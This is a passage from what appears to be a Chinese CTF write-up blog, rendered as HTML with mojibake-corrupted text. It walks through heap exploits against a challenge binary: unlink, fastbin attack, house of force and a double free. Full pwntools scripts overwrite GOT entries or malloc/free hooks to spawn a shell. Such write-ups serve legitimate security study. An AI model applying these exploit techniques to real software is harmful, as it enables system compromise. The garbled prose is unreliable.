   gdb.attach(r,cmd)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sa(<span class="hljs-string">&#x27;Please enter the name of item:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Please enter the index of item:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>        sla(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sa(<span class="hljs-string">&#x27;Please enter the new name of the item:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Please enter the index of item:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>        sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>add(<span class="hljs-number">0x21</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#2</span><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)<span class="hljs-comment">#ä¿®æ”¹1çš„fdæŒ‡é’ˆï¼ŒæŒ‡å‘mainå¼€å§‹æ—¶ç”³è¯·çš„å†…å­˜åœ°å€</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>,payload)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;AAA&#x27;</span>)<br>backdoor = <span class="hljs-number">0x0400D49</span><br>add(<span class="hljs-number">0x18</span>,p64(<span class="hljs-number">0</span>)+p64(backdoor))<br>exit()<br>debug()<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="unlinkåšæ³•ï¼š">unlinkåšæ³•ï¼š</h4><p>unlinkå­¦ä¹ ï¼š<a href="https://blog.csdn.net/qq_41202237/article/details/108481889"> å¥½å¥½è¯´è¯ä¹‹unlink_hollkâ€™s blog-CSDNåšå®¢</a></p><p>æœ¬é¢˜å…·ä½“æ­¥éª¤ï¼š</p><p>1.ç”³è¯·å¦‚ä¸‹å †å—</p><p><strong>chunk0:0x30</strong>ï¼ˆè‡³å°‘ä¸º0x30ï¼Œæœ‰è¶³å¤Ÿå¤§å°æ”¾å…¥fake_chunk,0x8(prev_size) + 0x8(size) + 0x8(fd) + 0x8(bk) + 0x8(next_prev) + 0x8(next_size) = 0x30ï¼Œè¿™é‡Œ0x8(next_prev) + 0x8(next_size)ä¸ç”¨ç®¡ï¼Œç”¨â€™aâ€™å¡«å……ï¼‰</p><p><strong>chunk1:0x80</strong>ï¼ˆè‡³å°‘ä¸º0x80ï¼Œèƒ½åˆ†é…åˆ°unsortbinï¼‰</p><p><strong>chunk2:0x20</strong>ï¼ˆä»»æ„å¤§å°ï¼Œé˜²æ­¢ä¸topchunkåˆå¹¶ï¼‰</p><p>2.åœ¨chunk0ä¸­ä¼ªé€ ä¸€ä¸ªfake_chunk</p><p>target=å­˜æŒ‡é’ˆæ•°ç»„çš„åœ°æ–¹</p><p>ï¼ˆfdä¸bkè¦æ»¡è¶³åœ¨æŒ‡é’ˆæ•°ç»„ä¸­æ„æˆåŒå‘é“¾è¡¨ï¼ŒæŠŠæŒ‡é’ˆæ•°ç»„çœ‹æˆchunkï¼Œæˆ‘è¿™è¾¹æˆä¸ºæŒ‡é’ˆæ•°ç»„chunkï¼‰</p><p>fd=target-0x18#è¦æ„æˆåŒå‘é“¾è¡¨ï¼Œfdå­˜çš„æ˜¯å‰ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„chunkçš„prevsizeåœ°å€ï¼Œè€Œfake_chunkç›¸å¯¹å‰ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„chunkæ˜¯åä¸€ä¸ªchunkï¼Œæ‰€ä»¥å‰ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„chunkçš„fdå¤„ï¼ˆå³target-0x18ï¼‰è¦ä¸ºfake_chunkçš„addr</p><p>bk=target-0x10#ä¸ä¸Šé¢ç±»ä¼¼ï¼Œå› ä¸ºæ˜¯bkï¼Œæ‰€ä»¥åªè¦å¡«target-0x100x10</p><p>ï¼ˆfake_chunkä¸æŒ‡é’ˆæ•°ç»„chunkæ„æˆåŒå‘é“¾è¡¨ï¼Œåˆ©ç”¨æŒ‡é’ˆæ•°ç»„é‡Œå­˜çš„fake_chunkåœ°å€ç»•è¿‡æ£€æŸ¥ï¼‰</p><p>fake_chunk=p64(0)+p64(0x30)<br>fake_chunk+=p64(fd)+p64(bk)<br>fake_chunk+=â€˜aâ€™*0x10<br>fake_chunk+=p64(0x30)+p64(0x90) #æº¢å‡ºä¿®æ”¹chunk1çš„prev_size=30,size=90</p><p><strong>chunkçŠ¶æ€æ£€æŸ¥</strong>ï¼š</p><p><strong>æ£€æŸ¥1</strong>ï¼šæ£€æŸ¥ä¸è¢«é‡Šæ”¾chunkç›¸é‚»é«˜åœ°å€çš„chunkçš„prevsizeçš„å€¼æ˜¯å¦ç­‰äºè¢«é‡Šæ”¾chunkçš„sizeå¤§å°</p><p><strong>æ£€æŸ¥2</strong>ï¼šæ£€æŸ¥ä¸è¢«é‡Šæ”¾chunkç›¸é‚»é«˜åœ°å€çš„chunkçš„sizeçš„Pæ ‡å¿—ä½æ˜¯å¦ä¸º0</p><p><strong>æ£€æŸ¥3</strong>ï¼šæ£€æŸ¥å‰åè¢«é‡Šæ”¾chunkçš„fdå’Œbk</p><p>è¿™æ ·å†™å°±ç»•è¿‡äº†æ£€æŸ¥ï¼Œè®©å®ƒä»¥ä¸ºæ˜¯ä¸ªç©ºé—²çš„å—</p><p>3.é‡Šæ”¾é‚£ä¸ªunsortbinå¤§å°çš„chunk1ï¼Œè§¦å‘unlink,ï¼ˆæŠŠfake_chunkä»åŒå‘é“¾è¡¨ä¸­æ‘˜é™¤ï¼Œä½†ç”±äºç»„æˆåŒå‘é“¾è¡¨çš„éƒ½æ˜¯æŒ‡é’ˆæ•°ç»„chunkï¼Œä»–ä»¬çš„fdä¸bké‡æ–°èµ‹å€¼åè¿˜æ˜¯åœ¨æŒ‡é’ˆæ•°ç»„é‚£é‡Œï¼Œè€Œä¸”æ”¹äº†åŒä¸€ä¸ªåœ°æ–¹ä¸¤æ¬¡ï¼Œæœ€åæ•ˆæœå°±æ˜¯æŠŠchunk0çš„æŒ‡é’ˆæ•°ç»„åœ°å€æ”¹ä¸ºäº†æŒ‡é’ˆæ•°ç»„åœ°å€é™„è¿‘ï¼Œå°±å¯ä»¥å¯¹æŒ‡é’ˆæ•°ç»„è¿›è¡Œchunkçš„æ“ä½œï¼‰</p><p>4.ç¼–è¾‘chunk0ï¼Œä½¿æŒ‡é’ˆæŒ‡å‘atoiçš„gotè¡¨åœ°å€ï¼Œæ³„éœ²gotè¡¨</p><p>5.è®¡ç®—å‡ºlibc_baseå’Œsystem</p><p>6.ç¼–è¾‘chunk0æŠŠgotè¡¨åœ°å€æ”¹ä¸ºsystemåœ°å€ï¼Œä»¥åè¦è°ƒç”¨atoiå°±è°ƒç”¨äº†system</p><p>7.æ‰¾åˆ°ç¨‹åºä¸‹ä¸€ä¸ªè¦å¡«atoiå‚æ•°çš„åœ°æ–¹ï¼Œå¡«å…¥/bin/sh\x00ï¼Œå¼€shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<span class="hljs-comment">#2</span><br>target = <span class="hljs-number">0x06020C8</span><br>fd = target-<span class="hljs-number">0x18</span><br>bk = target-<span class="hljs-number">0x10</span><br>fake_chunk=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x30</span>)<br>fake_chunk+=p64(fd)+p64(bk)<br>fake_chunk+=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>fake_chunk+=p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(fake_chunk),fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>pd=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x30</span>)+p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>])<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(pd),pd)<br>show()<br>ru(<span class="hljs-string">&#x27;0 : &#x27;</span>)<br>atoi_got=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(atoi_got)<br><span class="hljs-comment">#------------------------------------------------------</span><br>obj=LibcSearcher(<span class="hljs-string">&#x27;atoi&#x27;</span>,atoi_got)<br>base=atoi_got-obj.dump(<span class="hljs-string">&#x27;atoi&#x27;</span>)<br><span class="hljs-comment">#print hex(base)</span><br>system=base+obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system))<br>sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<span class="hljs-comment">#2</span><br>target = <span class="hljs-number">0x06020C8</span><br>fd = target-<span class="hljs-number">0x18</span><br>bk = target-<span class="hljs-number">0x10</span><br>fake_chunk=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x30</span>)<br>fake_chunk+=p64(fd)+p64(bk)<br>fake_chunk+=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>fake_chunk+=p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(fake_chunk),fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>pd=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x30</span>)+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(pd),pd)<br>show()<br>ru(<span class="hljs-string">&#x27;0 : &#x27;</span>)<br>free_got=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(free_got)<br><span class="hljs-comment">#------------------------------------------------------</span><br>obj=LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_got)<br>base=free_got-obj.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br><span class="hljs-comment">#print hex(base)</span><br>system=base+obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="å¦ä¸€ç§faskbin-attackåšæ³•">å¦ä¸€ç§faskbin attackåšæ³•</h4><p>ï¼ˆç”¨äº†unsortbinçš„ä¸€ä¸ªæ€§è´¨ï¼‰</p><p>1.ç”³è¯·å¦‚ä¸‹chunk</p><p>2.å †æº¢å‡ºchunk0ä¿®æ”¹chunk1çš„sizeä½¿å…¶è¦†ç›–chunk1ï¼Œchunk2</p><p>3.free(1)åï¼ˆè¯¯ä½¿ä»–é‡Šæ”¾åˆ°äº†unsortbinä¸­ï¼‰ï¼Œå†ç”³è¯·å›æ¥åŸæ¥çš„å¤§å°ï¼Œå°±ä¼šä½¿main_arenaé™„è¿‘çš„åœ°å€è·‘åˆ°chunk2ä¸­</p><p>4.showä¸€ä¸‹æ¥å—chunk2é‡Œé¢æ³„éœ²çš„åœ°å€addr</p><p>5.libc_base=addr-88-libc.sym[â€˜__malloc_hookâ€™]-0x10</p><p>â€‹     æˆ– libc_base=addr-88-main_arena</p><p>ï¼ˆmain_arenaçš„å€¼ ï¼Œå¯ä»¥å»idaæŸ¥çœ‹libcæ–‡ä»¶é‡Œmalloc_trimå‡½æ•°v22å˜é‡çš„å€¼ï¼‰</p><p>6.og=base+og</p><p>7.é‡Šæ”¾chunk1å å †æº¢å‡ºchunk0ä¿®æ”¹fdä¸ºmalloc_hook-0x23</p><p>(malloc_hook-0x23æ˜¯å› ä¸ºé‚£è¾¹æœ‰ä¸ª7få¯ä»¥ç”¨æ¥ç»•è¿‡chunkçš„æ£€æŸ¥)</p><p>8.ç”³è¯·ä¸¤æ¬¡0x60å¤§å°çš„chunkï¼Œç¬¬äºŒæ¬¡ç”³è¯·çš„chunkå°±åœ¨malloc_hook-0x23å¤„äº†</p><p>9.åœ¨è¿™ä¸ªchunkæŠŠmalloc_hookè¦†å†™ä¸ºog</p><p>ps:æœ‰æ—¶ogæ‰“ä¸é€šï¼Œå¯ç”¨og+reallocç»“åˆçš„æ–¹æ³•æµ‹è¯•è¿‡å»,</p><p>10.æœ€åç»“æœå°±æ˜¯è¦æ‰§è¡Œmallocçš„è¯ï¼Œå¸¦åŠ¨mallocçš„hookå‡½æ•°å®é™…ä¸ºogï¼Œå°±ä¼šå¼€shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<span class="hljs-comment">#1 </span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<span class="hljs-comment">#2 </span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;ddd&#x27;</span>)<span class="hljs-comment">#3 é˜²æ­¢å‰ä¸€ä¸ªé‡Šæ”¾åä¸topchunkåˆå¹¶</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>show()<br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr)<br>main_arena=<span class="hljs-number">0x3C4B20</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>])<br>base=addr-<span class="hljs-number">88</span>-main_arena<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc=base + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>shell=base+o_g_old[<span class="hljs-number">1</span>]<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(shell)+p64(realloc+<span class="hljs-number">10</span>))<br>sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sa(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="house-of-forceåšæ³•ï¼š">house of forceåšæ³•ï¼š</h4><h5 id="åˆ©ç”¨æ¡ä»¶ï¼š">åˆ©ç”¨æ¡ä»¶ï¼š</h5><ol><li>éœ€è¦æœ‰åŠæ³•èƒ½å¤Ÿæ›´æ”¹åˆ°top chunkå¤§å°ï¼›</li><li>éœ€è¦èƒ½å¤ŸçŸ¥é“å½“å‰ä½ç½®å’Œè¦å†™ä½ç½®çš„å·®å€¼ï¼›</li><li>éœ€è¦èƒ½å¤Ÿè‡ªç”±æ§åˆ¶å°†è¦åˆ†é…çš„chunkçš„å¤§å°ï¼Œä¹Ÿå°±æ˜¯mallocçš„å‚æ•°å€¼ã€‚</li></ol><h5 id="æ¡ä»¶æ£€æµ‹ï¼š">æ¡ä»¶æ£€æµ‹ï¼š</h5><p>æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span><br><span class="hljs-meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                                      \</span><br><span class="hljs-meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="hljs-meta">         ? MINSIZE                                                             \</span><br><span class="hljs-meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><br><span class="hljs-comment">/*  Same, except also perform argument check */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> checked_request2size(req, sz)                                          \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="hljs-meta">        __set_errno(ENOMEM);                                                   \</span><br><span class="hljs-meta">        return 0;                                                              \</span><br><span class="hljs-meta">    &#125;                                                                          \</span><br><span class="hljs-meta">    (sz) = request2size(req);</span><br></code></pre></td></tr></table></figure><p>1.reqè¦å°äº-2*MINSIZEï¼Œä¸€èˆ¬å–è´Ÿå€¼åº”è¯¥éƒ½èƒ½æ»¡è¶³</p><p>2.(req) + SIZE_SZ + MALLOC_ALIGN_MASK çš„å€¼è¦å¤§äºMINSIZE</p><p>å³ç”³è¯·çš„sizeè¦å¤§äºMINSIZE</p><h5 id="åç§»æµ‹å®šï¼š"><strong>åç§»æµ‹å®šï¼š</strong></h5><p><strong>MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</strong></p><p>å› ä¸ºsize=(req) + SIZE_SZ + MALLOC_ALIGN_MASK</p><p>æˆ‘ä»¬è‹¥è¦ç”³è¯·-0x60å¤§å°,å‚æ•°reqå°±è¦è®¾ç½®ä¸º</p><p>req=-0x60-SIZE_SZ- MALLOC_ALIGN_MASK</p><p>psï¼šè¿™é‡Œ0x60æ˜¯16ä½å¯¹é½çš„ï¼Œå¦‚æœä¸å¯¹é½çš„è¯è¿˜è¦è€ƒè™‘æºç ä¸­</p><p>(req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK çš„æ“ä½œ</p><p>ï¼ˆ<strong>&amp;æ˜¯æŒ‰ä½ä¸</strong> <strong>~æ˜¯ å–éï¼‰</strong></p><h5 id="æœ¬é¢˜å…·ä½“æ­¥éª¤ï¼š">æœ¬é¢˜å…·ä½“æ­¥éª¤ï¼š</h5><p>1.ç”³è¯·0x30å¤§å°å †å—ï¼ŒæŸ¥çœ‹top chunkçš„topæŒ‡é’ˆï¼ˆæœ¬é¢˜å¯å¾—ä¸º0xfc7060ï¼‰</p><p>2.å †æº¢å‡ºä¿®æ”¹top chunk size ä¸º0xffffffffffffffffï¼Œä½¿å¾—æˆ‘ä»¬èƒ½ç”³è¯·è´Ÿæ•°å¤§å°çš„chunk</p><p>ï¼ˆsizeä¼šè¢«å¼ºè½¬æˆæ— ç¬¦å·æ•´æ•°ï¼Œè´Ÿæ•°ä¼šå˜ä¸ºæå¤§å€¼ï¼‰</p><p>3.æˆ‘ä»¬æ‰€è¦ä¿®æ”¹topæŒ‡é’ˆä¸º0xfc7000ï¼Œå¯å¾—ç›¸å·®å¤§å°ä¸º-0x60</p><p>ç”³è¯·çš„å‚æ•°sizeå¤§å°è®¾ç½®ä¸º-0x60-0x8-0xf</p><p>4.ç”³è¯·è¿™ä¸ªå¤§å°çš„å †å—åtopæŒ‡é’ˆå˜ä¸ºäº†0xfc7000</p><p>5.å†ç”³è¯·å †å—å°±ä¼šåœ¨0xfc7000çš„ä½ç½®ç”³è¯·ï¼Œæˆ‘ä»¬è¿™é‡Œé¡ºä¾¿å¡«å…¥åé—¨å‡½æ•°magicçš„åœ°å€</p><p>6.é€‰ç”¨5é€‰é¡¹æœ¬è¯¥è°ƒç”¨gogdebyeå´è°ƒç”¨äº†åé—¨å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">magic = <span class="hljs-number">0x400d49</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>payload = <span class="hljs-number">0x30</span> * <span class="hljs-string">&#x27;a&#x27;</span><br>payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x41</span>,payload)<br>offest=-(<span class="hljs-number">0x60</span>+<span class="hljs-number">0x8</span>+<span class="hljs-number">0xf</span>)<br>add(offest,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(magic) * <span class="hljs-number">2</span>)<br>debug()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-en-3">ciscn_2019_en_3</h3><h4 id="æŸ¥çœ‹ä¿æŠ¤ï¼š">æŸ¥çœ‹ä¿æŠ¤ï¼š</h4><p>ä¿æŠ¤å…¨å¼€ï¼Œå¤šäº†ä¸€ä¸ªfortifyï¼Œ%n$xç±»å‹çš„fmtåˆ©ç”¨ä¼šè¢«æ‹¦æˆª</p><h4 id="å¤§è‡´æ€è·¯ï¼š">å¤§è‡´æ€è·¯ï¼š</h4><p>æ³„éœ²libcï¼Œç„¶ådouble_freeæ”¹free_hookä¸ºsystemï¼Œå¼€shell</p><h4 id="expï¼š">expï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./ciscn_2019_en_3&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span 